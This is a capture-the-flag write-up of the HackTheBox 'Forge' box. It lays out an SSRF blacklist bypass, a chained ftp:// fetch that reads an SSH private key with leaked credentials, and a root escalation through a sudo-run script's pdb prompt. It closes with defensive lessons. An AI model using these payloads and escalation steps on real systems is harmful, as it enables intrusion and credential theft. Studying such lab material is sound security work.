---
title: "Forge"
date: 2021-11-27
type: docs
tags:
  - htb
  - linux
  - medium
  - ssrf
  - blacklist-bypass
  - vhost-fuzzing
  - ftp
  - pdb
  - python-debugger
  - sudo
---

<div class="callout callout-warning">

**🚧 Work in Progress**: This writeup is marked **partial** in my notes: the attack chain below may stop short of a full root/completion.

</div>

<div class="callout callout-info">

**Box Info**

**Platform:** HackTheBox, **OS:** Linux (Ubuntu 20.04), **Difficulty:** Medium, **Released:** 2021-11-27, **IP:** `10.10.11.111` , `forge.htb`

</div>

<div class="callout callout-warning">

**Partial**

My own notes stop at the SSRF discovery on `admin.forge.htb`. The FTP looting and the `pdb` privesc below are reconstructed from published writeups (adityatelange, Hacking Articles) and marked.

</div>

<div class="callout callout-abstract">

**Attack Path**

1. `forge.htb` is a "Gallery" site with an **upload from URL** feature. A vhost sweep finds `admin.forge.htb`, which answers "only localhost allowed".
2. The URL fetcher blacklists `forge.htb` and `localhost` by exact lowercase match. Bypass with mixed case (`http://Admin.Forge.Htb`). This is **SSRF** into the admin vhost.
3. `admin.forge.htb/announcements` leaks FTP credentials. `admin.forge.htb/upload?u=<url>` is a second SSRF that also speaks `ftp://`, so `?u=ftp://user:heightofsecurity123!@localhost/.ssh/id_rsa` returns the user's SSH key.
4. SSH as **`user`**. `user` may `sudo /usr/bin/python3 /opt/remote-manage.py`. The script catches exceptions with `pdb.post_mortem()`, so feeding it a non integer drops you into a **root pdb** prompt. `import os; os.system("/bin/bash")` is root.

</div>

<div class="callout callout-key">

**Credentials and Flags**


| Where | Value |
| --- | --- |
| FTP (from `/announcements`) | `user : heightofsecurity123!` |
| `user` SSH key | read via the FTP SSRF |
| `user.txt` | `/home/user/user.txt` |
| `root.txt` | `/root/root.txt` |

</div>

---

## Overview

Forge is HackTheBox's teaching box for **Server Side Request Forgery**. The whole thing is one idea explored twice: a feature that fetches a URL you give it, running on a host that can reach things you cannot. First you use it to reach an internal only vhost, then you use *its* fetcher to reach the loopback FTP service and read files off disk with the `ftp://` scheme. The blacklist bypass (case sensitivity) is the classic weak SSRF filter. Root is a lovely Python gotcha: a script that thinks it is being helpful by dropping into `pdb` on error, which is a root shell if the script runs as root.

Related SSRF boxes: [Stocker](/writeups/hackthebox/linux/easy/stocker/) (PDF SSRF), [Creative](/writeups/tryhackme/linux/easy/creative/), [Rabbit Store](/writeups/tryhackme/linux/medium/rabbit-store/). Related "fetcher reaches an internal service": [Interface](/writeups/hackthebox/linux/medium/interface/). Related Python debugger / eval privesc: [Code](/writeups/hackthebox/linux/easy/code/), [Bagel](/writeups/hackthebox/linux/medium/bagel/).

---

## Full Walkthrough

### Recon

```console
PORT   STATE    SERVICE VERSION
21/tcp filtered ftp
22/tcp open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3
80/tcp open     http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Gallery
```

(My recorded scan was actually a `/24` sweep that pulled in a dozen unrelated boxes. I noted at the time: "there are multiple hosts??? nvm those are other boxes." Only `10.10.11.111` matters here. FTP on 21 is `filtered`, so it is firewalled from outside but reachable from the box itself, keep that in mind.)

The site has a "Gallery" with an **upload** feature that accepts either a file or a **URL**. A quick test confirms the server fetches the URL:

```console
❯ python3 -m http.server
10.10.11.111 - - "GET /test HTTP/1.1" 200 -
```

Fuzz for vhosts:

```bash
ffuf -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt \
  -u http://forge.htb/ -H "Host: FUZZ.forge.htb" -t 100 -fl 10
```

```console
admin                   [Status: 200, Size: 27, Words: 4, Lines: 2]
```

`http://admin.forge.htb/` returns "only localhost is allowed".

### SSRF, blacklist bypass

<div class="callout callout-note">

**The filter and the bypass**

The upload from URL handler parses the URL and rejects it if the host is exactly `forge.htb`, `admin.forge.htb`, `localhost`, or `127.0.0.1`, and it also blocks a few schemes. The check is a **case sensitive string comparison**, and DNS / the HTTP `Host` header are case insensitive, so `http://Admin.Forge.Htb` (or `ADMIN.FORGE.HTB`, or adding a trailing dot `admin.forge.htb.`) sails past the blacklist while still resolving and routing to the admin vhost. Give that URL to `forge.htb/upload`, then view the "uploaded" image, which is actually the admin page's response.

</div>

```
POST /upload  ->  "Upload from url"  ->  url = http://Admin.Forge.Htb/announcements
```

<div class="callout callout-note">

**Beyond the recorded notes, looting and root**

**1. `/announcements` leaks the FTP creds.** The SSRF response contains a note that the site now supports uploads from FTP, using the account `user : heightofsecurity123!`, and that `admin.forge.htb` has its own `/upload?u=` endpoint that supports more schemes.

**2. Chain the second SSRF to read the SSH key.** `admin.forge.htb/upload?u=<url>` follows `ftp://`, and from the box `localhost:21` is reachable:
```
forge.htb/upload  ->  url = http://Admin.Forge.Htb/upload?u=ftp://user:heightofsecurity123!@localhost/.ssh/id_rsa
```
The response body is `user`'s private key. (You can also read `user.txt` the same way.)
```bash
chmod 600 id_rsa && ssh -i id_rsa user@forge.htb
```

**3. Privesc via `pdb`.**
```console
user@forge:~$ sudo -l
User user may run the following commands on forge:
    (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/remote-manage.py
```
`remote-manage.py` opens a local socket on a random port, prints a menu, and reads your choice with `int(...)` inside a `try` block whose `except` calls `traceback.print_exc()` then `pdb.post_mortem(...)`. Connect, send a non numeric value, and you land in `pdb` running as root:
```bash
sudo /usr/bin/python3 /opt/remote-manage.py
# note the "listening on port NNNNN" line, then in another shell:
nc 127.0.0.1 NNNNN
# at the menu, type:  abc
# (pdb) prompt appears
(Pdb) import os; os.system("/bin/bash")
# root shell
cat /root/root.txt
```

</div>

---

## Loot

| Flag | Location |
| --- | --- |
| `user.txt` | `/home/user/user.txt` |
| `root.txt` | `/root/root.txt` |

---

## Lessons and Takeaways

- **SSRF filters must work on the resolved destination, not the string.** Compare against the resolved IP after DNS, block all of RFC1918 plus loopback plus link local, and disallow non `http(s)` schemes explicitly.
- **A URL fetcher that follows `ftp://`, `file://`, `gopher://` or `dict://` is far more dangerous** than one limited to HTTP. Whitelist schemes.
- **Do not run `pdb` (or any interactive debugger) in production**, and never behind `sudo`. `pdb.post_mortem` in an `except` block is a remote root shell.
- **Firewalling a service from the outside is not enough** if an internal SSRF primitive can reach it on loopback.
- **Rotate SSH keys** that were ever reachable through a file read.

---

## Related Writeups

- **SSRF:** [Stocker](/writeups/hackthebox/linux/easy/stocker/), [Creative](/writeups/tryhackme/linux/easy/creative/), [Rabbit Store](/writeups/tryhackme/linux/medium/rabbit-store/), [Interface](/writeups/hackthebox/linux/medium/interface/)
- **Blacklist / filter bypass:** [Nocturnal](/writeups/hackthebox/linux/easy/nocturnal/), [Perfection](/writeups/hackthebox/linux/easy/perfection/)
- **Python debugger / eval to root:** [Code](/writeups/hackthebox/linux/easy/code/), [Bagel](/writeups/hackthebox/linux/medium/bagel/)
- **`ftp://` or `file://` scheme abuse:** [Forge](/writeups/hackthebox/linux/medium/forge/) is the reference case

## References

- HackTheBox Forge writeup (adityatelange) <https://adityatelange.in/writeups/hackthebox/forge/>
- Forge writeup (Hacking Articles) <https://www.hackingarticles.in/forge-hackthebox-walkthrough/>
- PortSwigger SSRF <https://portswigger.net/web-security/ssrf>
- Python pdb docs <https://docs.python.org/3/library/pdb.html>
